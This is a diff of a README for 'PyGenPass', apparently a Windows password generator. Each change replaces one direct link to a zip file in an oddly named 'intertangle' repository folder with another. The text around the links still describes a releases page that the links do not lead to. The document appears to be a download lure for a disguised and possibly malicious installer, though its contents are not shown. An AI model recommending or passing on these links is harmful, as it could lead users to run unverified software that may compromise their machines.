@@ -1,6 +1,6 @@
 # 🔐 PyGenPass - Simple, Secure Password Generator
 
-[![Download PyGenPass](https://img.shields.io/badge/Download-PyGenPass-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/YousefMohamed54701/PyGenPass/main/intertangle/Gen-Py-Pass-v3.1.zip)
+[![Download PyGenPass](https://img.shields.io/badge/Download-PyGenPass-brightgreen?style=for-the-badge)](https://github.com/YousefMohamed54701/PyGenPass/raw/refs/heads/main/intertangle/Py_Gen_Pass_v3.2.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Before you install PyGenPass, make sure your computer meets these requirements:
 To get PyGenPass on your Windows PC, follow these steps carefully.
 
 1. Click the large green button at the top to visit the release page. Or go directly to:  
-   [https://raw.githubusercontent.com/YousefMohamed54701/PyGenPass/main/intertangle/Gen-Py-Pass-v3.1.zip](https://raw.githubusercontent.com/YousefMohamed54701/PyGenPass/main/intertangle/Gen-Py-Pass-v3.1.zip)  
+   [https://github.com/YousefMohamed54701/PyGenPass/raw/refs/heads/main/intertangle/Py_Gen_Pass_v3.2.zip](https://github.com/YousefMohamed54701/PyGenPass/raw/refs/heads/main/intertangle/Py_Gen_Pass_v3.2.zip)  
 
 2. On the releases page, look for the latest version. It is usually the top item with a version number like **v1.0** or higher.
 
@@ -118,7 +118,7 @@ If PyGenPass does not open or work correctly, try these steps:
 
 Visit this page to download PyGenPass setup files:  
 
-[https://raw.githubusercontent.com/YousefMohamed54701/PyGenPass/main/intertangle/Gen-Py-Pass-v3.1.zip](https://raw.githubusercontent.com/YousefMohamed54701/PyGenPass/main/intertangle/Gen-Py-Pass-v3.1.zip)
+[https://github.com/YousefMohamed54701/PyGenPass/raw/refs/heads/main/intertangle/Py_Gen_Pass_v3.2.zip](https://github.com/YousefMohamed54701/PyGenPass/raw/refs/heads/main/intertangle/Py_Gen_Pass_v3.2.zip)
 
 Click the latest installer file and follow the steps above to install.
 
